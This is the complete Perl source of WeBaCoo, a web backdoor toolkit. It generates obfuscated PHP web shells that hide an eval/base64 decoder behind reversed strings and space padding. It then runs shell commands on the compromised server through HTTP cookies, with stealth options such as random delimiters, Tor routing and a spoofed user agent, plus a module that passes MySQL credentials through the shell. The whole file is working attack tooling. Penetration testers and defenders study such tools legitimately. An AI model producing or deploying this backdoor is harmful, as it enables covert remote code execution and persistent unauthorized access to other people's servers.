#!/usr/bin/perl
# WeBaCoo - Web Backdoor Cookie Scripkit
# Copyright(c) 2011-2012 Anestis Bechtsoudis
# Website: https://github.com/anestisb/WeBaCoo

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

use strict;
use warnings;
use URI;
use Getopt::Std;
use MIME::Base64;
use IO::Socket;
use IO::Socket::Socks;
use Term::ANSIColor qw(:constants);

## Variables ##
my(%WEBACOO,%args);

# PHP system functions used in backdoor code
my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");

# Setup
$WEBACOO{name} = "webacoo.pl";
$WEBACOO{version} = '0.2.1';
$WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
$WEBACOO{author} = 'Anestis Bechtsoudis';
$WEBACOO{email} = 'anestis@bechtsoudis.com';
$WEBACOO{website} = 'http(s)://bechtsoudis.com';
$WEBACOO{twitter} = '@anestisb';
$WEBACOO{sfuntion} = $phpsf[0]; 		# Default is system()
$WEBACOO{agent} = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2";
$WEBACOO{cookie} = "M-cookie";			# Default cookie name
$WEBACOO{delim} = '8zM$';			# Initialize delimiter
$WEBACOO{url} = '';
$WEBACOO{rhost} = '';
$WEBACOO{rport} = '80';
$WEBACOO{uri} = '';
$WEBACOO{proxy_ip} = '';
$WEBACOO{proxy_port} = '';
$WEBACOO{vlevel} = 0;				# Default verbose level=0
$WEBACOO{tor_ip} = "127.0.0.1";			# Default tor ip
$WEBACOO{tor_port} = "9050";			# Default tor port
$WEBACOO{shell_name} = "webacoo";		# Shell name
$WEBACOO{shell_head} = '$ ';			# Shell head character

## Help Global Variables ##
my $command = '';
my $loaded_module = '';
my $module_ext_head = '';
my $module_ext_tail = '';
my $request = '';
my $output = '';
my $sock = '';

# HTTP Proxy variables
my @pargs = ();
my $proxy_user = '';
my $proxy_pass = '';

# Verbose data
my @verdata = ();

# Print WeBaCoo logo
print_logo();

# Parse command args
getopts("gf:ro:tu:c:a:d:p:v:h", \%args) or die "[-] Problem with the supplied arguments.\n";

# Check for newer version & apply update
if(defined $ARGV[0] && $ARGV[0] eq "update") { update(); }
# Check for invalid arguments
elsif(defined $ARGV[0]) { print "[-] Unknown option:$ARGV[0]\n"; exit; }

# Print usage in -h case
print_usage() if $args{h};

#################################################################################
# Generate backdoor code
#################################################################################
if(defined $args{g}) {

    # Check output filename
    if(!defined $args{o}) {
        print "[-] No output file specified.\n";
	exit;
    }

    # Check PHP function number if -f is used
    if(defined $args{f}) {
        if($args{f} =~ /^[1-5]$/) { $WEBACOO{sfuntion} = $phpsf[$args{f}-1]; }
	else { 
	    print "[-] -f $args{f}: Unknown function number.\n";
	    print "\nUse -h for help\n";
	    exit;
	}
    }

    generate_backdoor();
    exit;
}

#################################################################################
# Establish remote "terminal" connection
#################################################################################
if(defined $args{t}) {

    # Check URL
    if(!defined $args{u}) {
	print "[-] No url specified.\n";
	exit;
    }

    # Parse URL
    $WEBACOO{url} = URI->new($args{u});
    $WEBACOO{rhost} = $WEBACOO{url}->host;
    $WEBACOO{rport} = $WEBACOO{url}->port;
    $WEBACOO{uri} = $WEBACOO{url}->path;

    # Check for user specified user-agent
    if(defined $args{a}) { $WEBACOO{agent}=$args{a}; }

    # Check for user specified cookie-name
    if(defined $args{c}) { $WEBACOO{cookie}=$args{c}; }

    # Check for user specified delimiter
    if(defined $args{d}) { 
        $WEBACOO{delim}=$args{d};
	print "[!] Delimiter will remain the same for every request.\n";
	print "    Without the -d flag, a different random delimiter is used for each request,\n";
        print "    enhancing stealth behavior.\n\n";
    }

    # Delimiter cannot be equal to cookie name
    if(defined $args{d} && defined $args{c} && ($args{d} eq $args{c})) { 
	print "[-] Use DELIM != C_NAME\n"; exit; 
    }

    # Check for user specified verbose levels
    if(defined $args{v}) {
	if($args{v} =~ /^[0-2]$/) { $WEBACOO{vlevel} = $args{v}; }
        else {
            print "[-] -v $args{v}: Unknown verbosity level.\n";
            print "\nUse -h for help\n";
            exit;
        }
    }

    # If Tor check connectivity status
    if(defined $args{p} && $args{p} eq "tor") { tor_check(); }
    
    # Initial check & print user info
    $command="id";
    print "[+] Connecting to remote server as...\n";
    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
    else { cmd_request(); }
    print "\n";

    # Print help messages
    print "[!] Type 'load' to use an extension module.\n";
    print "[!] Type 'exit' to quit terminal.\n\n";

    # "Terminal" connection loop
    while(1) {
        # Check if terminal before user interraction
        if(-t STDOUT) { 
            print BOLD,RED,$WEBACOO{shell_name},BLUE,$WEBACOO{shell_head},RESET; 
        }
	else { print '[-] Need to run under terminal.'; exit; }
    	chop($command=<STDIN>);

	# Exit if "exit" is typed
    	if($command eq "exit") { print "Bye...\n"; last; }
	# Check for module load function
	elsif($command eq "load") { load_module(); next; }
        # Check for module unload function
	elsif($command eq "unload") { unload_module(); next; }

	# If no user specified delimiter, set a new random one for each request
	random_delim() if(!defined $args{d});

	# Follow the relative branch (normal or through TOR)
    	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request("1"); }
        else { cmd_request("1"); }
    }
}


#################################################################################
# Help functions
#################################################################################

#################################################################################
# Print logo
sub print_logo
{
    # Check if terminal for colored output
    if(-t STDOUT) {
    	print "\n",BLUE,BOLD,"\tWeBaCoo $WEBACOO{version}",RESET;
    	print BLUE," - $WEBACOO{description}\n";
        print GREEN,"\tCopyright (C) 2011-2012 ",RESET,GREEN,BOLD,"$WEBACOO{author}\n",RESET;
    	print GREEN,"\t{ ",YELLOW,"$WEBACOO{twitter} ",GREEN,"|",YELLOW," $WEBACOO{email} ";
    	print GREEN,"|",YELLOW," $WEBACOO{website}",GREEN," }\n\n",RESET;

    	# Flush output buffer
    	$|++;
    }
    else {
	print "\n\tWeBaCoo $WEBACOO{version} - $WEBACOO{description}\n";
        print "\tCopyright (C) 2011-2012 $WEBACOO{author}\n";
        print "\t{ $WEBACOO{twitter} | $WEBACOO{email} | $WEBACOO{website} }\n\n";
    }
}

#################################################################################
# Update
sub update
{
    # Search for project dir & git system command
    if(-d "./.git/" && !system("which git > /dev/null")) {
        print "[+] Checking for newer versions...\n";
        system("git pull");
        print "\n";
    }
    else {
        print "[-] Error with git repository update.\n\n";
        print "Download latest version from:\n";
        print "https://github.com/anestisb/WeBaCoo/zipball/master\n\n";
    }
}

#################################################################################
# Print help page
sub print_usage
{
print qq(
Usage: webacoo.pl [options]

Options:
  -g		Generate backdoor code (-o is required)

  -f FUNCTION	PHP System function to use
	FUNCTION
		1: system 	(default)
		2: shell_exec
		3: exec
		4: passthru
		5: popen

  -o OUTPUT	Generated backdoor output filename

  -r 		Return un-obfuscated backdoor code

  -t		Establish remote "terminal" connection (-u is required)

  -u URL	Backdoor URL

  -c C_NAME	Cookie name (default: "M-cookie")

  -d DELIM	Delimiter (default: New random for each request)

  -a AGENT	HTTP header user-agent (default exist)

  -p PROXY	Use proxy (tor, ip:port or user:pass:ip:port)

  -v LEVEL	Verbose level
	LEVEL
		0: no additional info (default)
		1: print HTTP headers
		2: print HTTP headers + data

  -h		Display help and exit

  update	Check for updates and apply if any
);

exit;
}

#################################################################################
# Generate backdoor code
sub generate_backdoor
{
    my $cmd = '';

    # Command is retrieved under the relative Cookie from the client 
    if (!$args{r}) { $cmd = "base64_decode(\$_COOKIE['cm'])"; }
    # If raw output mode used, protect base64 decoder
    else { $cmd = "\$b(\$_COOKIE['cm'])"; }

    # PHP system functions usage
    my %payloads = (
        "system" => "system($cmd.' 2>&1');",
        "shell_exec" => "echo shell_exec($cmd.' 2>&1');",
        "exec" => "exec($cmd.' 2>&1', \$d);echo(join(\"\\n\",\$d).\"\\n\");",
        "passthru" => "passthru($cmd.' 2>&1');",
        "popen" => "\$h=popen($cmd.' 2>&1','r');while(!feof(\$h))echo(fread(\$h,2048));pclose(\$h);",
    );

    # Form the final payload
    my $payload = "if(isset(\$_COOKIE['cm'])){ob_start();";
    $payload .= '$b=strrev("edoced_4"."6esab");' if ($args{r});
    $payload .= "$payloads{$WEBACOO{sfuntion}}setcookie(\$_COOKIE['cn'],\$_COOKIE['cp'].".
	"base64_encode(ob_get_contents()).\$_COOKIE['cp']);ob_end_clean();}";

    # PHP tags
    my $prefix = "<?php ";
    my $suffix = " ?>";

    # Check for raw code output flag,
    # otherwise encode payload & append the tags
    if(!defined $args{r}) {
        $payload = encode_base64($payload, '');
        # insert space after each character
	$payload =~ s/(\S{1})/$1 /g;
	$prefix .= '$b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","';
	$suffix = "\")));".$suffix;
    }

    # Create backdoor file
    open (OUTFILE, ">$args{o}");
    print OUTFILE $prefix.$payload.$suffix;
    close (OUTFILE);
    print "[+] Backdoor file \"$args{o}\" created.\n";
}

#################################################################################
# Backdoor cmd: send request & get response
sub cmd_request
{
    # Silent flag
    my $silent = @_;

    # Port assign
    my $dst_host = $WEBACOO{rhost};
    my $dst_port = $WEBACOO{rport};

    # Append & prepend extension modules data
    $command = $module_ext_head.$command.$module_ext_tail;

    # Check for Proxy args
    if(defined $args{p}) { 
	@pargs=split(':',$args{p});
	if(@pargs==2) { ($dst_host, $dst_port) = @pargs; }
	elsif(@pargs==4) { ($proxy_user, $proxy_pass, $dst_host, $dst_port) = @pargs; }
	else { 
	    print "[-] Invalid Proxy arguments.\n"; 
	    print "\nUse -h for help\n";
            exit; 
	}
    }

    # Form GET request
    $request = "GET http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
    $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
    $request .= "Agent: $WEBACOO{agent}\r\n";
    $request .= "Connection: Close\r\n";
    $request .= "Cookie: cm=".encode_base64($command,'').";".
        " cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
    $request .= "Proxy-Authorization: Basic ".encode_base64($proxy_user.":".$proxy_pass,'')."\r\n" if($proxy_user && $proxy_pass);
    $request .= "\r\n";

    # Print request if verbose level > 0
    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0 && $silent);

    # Establish connection
    $sock = IO::Socket::INET->new(
                                  PeerAddr=> $dst_host,
                                  PeerPort => $dst_port,
                                  Proto => "tcp",
                                 );
    # Error checking
    die "Could not create socket: $!\n" unless $sock;

    # Send GET request
    print $sock $request;

    # Get server response
    my $line;
    while ($line = <$sock>) { $output .= $line; }

    # Close socket
    close($sock);

    # Unescape URI escaped special characters
    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;

    # Split HTTP header + data and print according to verbose level
    @verdata = split (/^\r\n/m,$output);
    $verdata[1] = "" if (@verdata == 1); # If data field is empty
    chomp($verdata[0]);
    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0 && $silent);
    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1 && $silent);
    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0 && $silent);

    # Check for HTTP 4xx error status codes
    if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
    {
	print "\n[!] 4xx error server response.\n";
	print "Terminal closed.\n";
	exit ;
    }

    # Check if server responded with the correct cookie name
    if($output !~ m/Set-Cookie: $WEBACOO{cookie}/) {
        print "[-] Server has not responded with the expected cookie name.\n";
        exit;
    }

    # Locate cookie data
    my $start = index($output,$WEBACOO{delim})+length($WEBACOO{delim});
    my $end = index($output,$WEBACOO{delim},$start);
    $output = substr($output,$start,$end-$start);

    # Check for disabled PHP system functions
    if(!$output && $command eq "id") { 
	print "\n[-] Response cookie has no data.\n"; 
        print "[!] Backdoor PHP system function possibly disabled.\n";
    }
    # Decode response and print output
    else { 
        $output = decode_base64($output);
        # Beautify in case of mysql-cli module
	if($loaded_module eq "mysql-cli") {
	    $output =~ s/\n/\n\n/;
        }
	print $output; 
    }

    # Flush content buffers
    @verdata = ();
    $output = '';
}

#################################################################################
# Check Tor connectivity
sub tor_check
{
    print "[!] Checking Tor connectivity...\n\n";

    # Check Tor tcp socket
    my $tor_sock = IO::Socket::INET->new(
                                         PeerAddr => $WEBACOO{tor_ip},
                                         PeerPort => $WEBACOO{tor_port},
                                         Proto => "tcp",
                                        );
    if($tor_sock) { print "[+] TCP Socket is listening at $WEBACOO{tor_ip}:$WEBACOO{tor_port}\n"; }
    else { 
	print "[-] TCP Socket is not listening at $WEBACOO{tor_ip}:$WEBACOO{tor_port}\n\n"; 
	print "    Program exited.\n"; 
	exit;
    }

    # Hit whatismyip to find exit node ip
    $sock = IO::Socket::Socks->new(
				   ProxyAddr=>$WEBACOO{tor_ip},
                                   ProxyPort=>$WEBACOO{tor_port},
                                   ConnectAddr=>"98.207.221.49",
                                   ConnectPort=>"80",
                                  );
    die "Could not create socks proxy socket: $!\n" unless $sock;

    $request = "GET / HTTP/1.1\r\n";
    $request .= "Host: whatismyip.org:80\r\n";
    $request .= "\r\n";

    print $sock $request;

    my $line;
    while ($line = <$sock>) { $output .= $line; }

    if(defined $output) { print "[+] Tor connection established.\n"; }

    # Check if ip is valid
    if($output =~ m/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/)
    {
	print "Tor exit node: $1\n\n";
    }

    # Flush buffer & close socket
    $output='';
    close($sock);
}

#################################################################################
# Backdoor cmd over tor: send request & get response
sub tor_cmd_request
{
    # Silent flag
    my $silent = @_;

    # Append & prepend extension modules data
    $command = $module_ext_head.$command.$module_ext_tail;

    # Form GET request
    $request = "GET http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
    $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
    $request .= "Agent: $WEBACOO{agent}\r\n";
    $request .= "Connection: Close\r\n";
    $request .= "Cookie: cm=".encode_base64($command,'').";".
        " cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
    $request .= "\r\n";

    # Print request if verbose level > 0
    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0 && $silent);

    # Connect to server via Tor
    $sock = IO::Socket::Socks->new(
                                   ProxyAddr=>$WEBACOO{tor_ip},
                                   ProxyPort=>$WEBACOO{tor_port},
                                   ConnectAddr=>$WEBACOO{rhost},
                                   ConnectPort=>$WEBACOO{rport},
                                  );
    die "Could not create socks proxy socket: $!\n" unless $sock;

    # Send GET request
    print $sock $request;

    # Get server response
    my $line;
    while ($line = <$sock>) { $output .= $line; }

    # Close socket
    close($sock);

    # Unescape URI escaped special characters
    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;

    # Split HTTP header + data and print according to verbose level
    @verdata = split (/^\r\n/m,$output);
    $verdata[1] = "" if (@verdata == 1); # If data field is empty
    chomp($verdata[0]);
    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0 && $silent);
    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1 && $silent);
    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0 && $silent);

    # Check for HTTP 4xx error status codes
    if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
    {
        print "\n[!] 4xx error server response.\n";
        print "Terminal closed.\n";
        exit ;
    }

    # Check if server responded with the correct cookie name
    if($output !~ m/Set-Cookie: $WEBACOO{cookie}/) { 
	print "[-] Server has not responded with the expected cookie name.\n"; 
	exit;
    }

    # Locate cookie data
    my $start = index($output,$WEBACOO{delim})+length($WEBACOO{delim});
    my $end = index($output,$WEBACOO{delim},$start);
    $output = substr($output,$start,$end-$start);

    # Check for disabled PHP system functions
    if(!$output && $command eq "id") {
        print "\n[-] Response cookie has no data.\n";
        print "[!] Backdoor PHP system function possibly disabled.\n";
    }
    # Decode response and print output
    else {
        $output = decode_base64($output);
        # Beautify in case of mysql-cli module
        if($loaded_module eq "mysql-cli") {
            $output =~ s/\n/\n\n/;
        }
        print $output;
    }

    # Flush content buffers
    @verdata = ();
    $output = '';
}

#################################################################################
# Randomize delimiter string
sub random_delim
{
    # Base64 valid characters
    my @vchars=('a'..'z','A'..'Z','0'..'9');
    # Base64 non-valid characters
    my @nvchars=('!','@','#','$','%','^','&','*','?','~');

    # Flush delimiter
    $WEBACOO{delim}='';

    # Create new delimiter with 4 chars
    # 3 valid + 1 non-valid
    foreach (1..3)
    {
      $WEBACOO{delim}.=$vchars[rand @vchars];
    }
    $WEBACOO{delim}.=$nvchars[rand @nvchars];
}

#################################################################################
# Load extension modules
sub load_module
{
    my $mod_input = '';
   
    # Check if another module is loaded
    if($loaded_module) { 
	print "[-] Another module is loaded. Unload the old one first.\n";
	return;
    }

    # Print available modules
    print "[!] Type the module name with the correct arguments.\n\n";
    print "Currently available extension modules:\n";
    print "    mysql-cli <host> <user> <pass>\n\n";

    # Get user's choice
    print '> ';
    chop($mod_input=<STDIN>);

    # Check input
    my @modargs=split(' ',$mod_input);
    if (@modargs != 4) { print "[-] Error loading the module\n"; return; }

    # Check fom mysql-cli module (will be evolved when more modules are added)
    if ($modargs[0] ne "mysql-cli") { print "[-] Unknown module name\n"; return; }

    # Print module help messages
    print "[+] $modargs[0] module successfully loaded.\n\n";
    print "[!] Type 'unload' to unload the module and return to the original cmd.\n\n";

    # Update module related global variables
    $loaded_module = "mysql-cli";
    $WEBACOO{shell_name} = "mysql-cli";
    $WEBACOO{shell_head} = "> ";
    $module_ext_head = "mysql -h $modargs[1] -u$modargs[2] -p$modargs[3] -e '";
    $module_ext_tail = "'";
}

#################################################################################
# Unload extension modules
sub unload_module
{
    # Revert to initial state the module related global variables
    $WEBACOO{shell_name} = "webacoo";
    $WEBACOO{shell_head} = '$ ';
    $loaded_module = '';
    $module_ext_head = '';
    $module_ext_tail = '';
}
